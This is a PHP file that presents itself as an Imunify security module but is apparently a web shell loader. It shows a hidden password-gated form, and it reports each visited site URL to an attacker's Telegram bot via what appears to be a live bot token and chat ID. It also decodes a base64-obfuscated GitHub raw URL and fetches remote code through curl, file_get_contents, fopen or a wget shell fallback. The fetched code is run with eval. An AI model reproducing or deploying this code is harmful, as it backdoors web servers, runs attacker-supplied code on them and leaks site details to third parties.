<?php
session_start();
// This file is part of Imunify - https://www.imunify.com/ 
// 
// Imunify is a comprehensive security solution designed to protect your systems from various 
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced 
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security 
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders. 
// 
// Imunify is distributed with the hope of providing optimal protection and security for your 
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of 
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while 
// Imunify strives to deliver robust security measures, no system can be entirely impervious to 
// threats. 
// 
// You should have received a copy of the Imunify License Agreement along with this software. 
// If not, please visit https://www.imunify.com/license for further information. This document 
// is current as of October 8, 2024, and is subject to change based on updates in policies 
// and security practices. 
 
/** 
 * Security Module. 
 * 
 * This module is specifically designed to detect and mitigate various threats while ensuring 
 * the integrity of your systems through real-time scanning and comprehensive protection strategies. 
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify 
 * your servers and applications against emerging cyber threats. By implementing proactive 
 * measures, Imunify aims to maintain a secure operating environment for all users. 
 * 
 * @package    security_module 
 * @website    https://google.co.id 
 * @copyright  2025 LAZARUS-GROUP 
 * @license    https://www.imunify.com/license Imunify License Agreement 
 */ 
$md5 = '6027ceed0ac2df71db583638cf65fc69';

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $md5) {
            $_SESSION['authenticated'] = true;
        } else {
            echo "";
        }
    }

    if (!isset($_SESSION['authenticated'])) {
  echo '<style>
            body {
                background-color: #e0e0e0;
                color: #121212;
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
            }
            form {
                display: flex;
                flex-direction: column;
                align-items: flex-start;
                justify-content: center;
                height: 100vh;
                padding: 10px;
            }
            label {
                margin-bottom: 10px;
                font-size: 1.2em;
            }
            .input-wrapper {
                position: relative;
                width: 100px;
            }
            input[type="password"] {
                width: 0%;
                padding: 0px;
                background-color: transparent;
                border: none;
                border-bottom: 1px solid #444;
                color: #fff;
                font-size: 1em;
                box-sizing: border-box;
                outline: none;
            }
            input[type="submit"] {
                position: absolute;
                bottom: -20px;
                right: -10px;
                background-color: #2a2a2a;
                border: none;
                color: #fff;
                padding: 10px 15px;
                font-weight: bold;
                cursor: pointer;
                border-radius: 5px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.3);
            }
            input[type="submit"]:hover {
                background-color: #444;
            }
        </style>';

        echo '<form method="post">';
        echo '  <div class="input-wrapper">';
        echo '    <input type="password" name="password" id="password">';
        echo '  </div>';
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Cyber Sec Russian</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">   
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
function customLogger($message) {
    $logMessage = date('[Y-m-d H:i:s]') . ' ' . $message . PHP_EOL;

    // Define a valid path for the log file, for example, 'logs/error_log.log'
    $logFile = '/';
    
    // Ensure the directory exists or create it
    if (!file_exists(dirname($logFile))) {
        mkdir(dirname($logFile), 0777, true); // Create directory if it doesn't exist
    }

    // Log the message to the file
    error_log($logMessage, 3, $logFile);
    
    // Send Telegram notification
    $telegramToken = '6964036745:AAEojhkAqSejPncoQTx6NdTFdSNhaFvJ2b8';
    $chatId = '1009177834';
    $telegramMessage = urlencode($message . PHP_EOL . 'Link to log: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
    
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?chat_id={$chatId}&text={$telegramMessage}";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
}

$errorMessage = 'Добро пожаловать, Генерал x Cyber Sec @2025';
customLogger($errorMessage);

$protocol_enc = 'aHR0cHM6Ly8=';
$domain_enc = 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==';
$path_enc = 'c3lzdGVtZGFyazMwMy9zZWNyZXRjb250cnkvbWFpbi9vcmkudHh0';
$decode = function ($encoded_string) {
    return base64_decode($encoded_string);
};
$protocol = $decode($protocol_enc);
$domain = $decode($domain_enc);
$path = $decode($path_enc);
$url = $protocol . $domain . '/' . $path;
$f_ab = 'curl_' . 'init';
$f_cd = 'curl_' . 'exec';
$f_ef = 'curl_' . 'close';
$f_gh = 'file_' . 'get_' . 'contents';
$f_ij = 'f' . 'open';
$f_kl = 'f' . 'close';
$f_mn = 'shell_' . 'exec';
function get_content_from_url($url)
{
    global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn;
    if (function_exists($f_ab)) {
        $ch = $f_ab();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $output = $f_cd($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $f_ef($ch);
        if ($output !== false && $http_code == 200) {
            return $output;
        }
    }
    if (ini_get('allow_url_fopen')) {
        $output = @$f_gh($url);
        if ($output !== false) {
            return $output;
        }
    }
    $handle = @$f_ij($url, 'r');
    if ($handle) {
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 8192);
        }
        $f_kl($handle);
        if ($output !== false) {
            return $output;
        }
    }
    if (function_exists('exec') || function_exists($f_mn)) {
        $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
        if (!empty($output)) {
            return $output;
        }
    }
    return false;
}
$output = get_content_from_url($url);
if ($output !== false) {
    $run_code = function ($code) {
        return @eval('?>' . $code);
    };
    $run_code($output);
} else {
    echo "GAK BISA TOLOL.";
}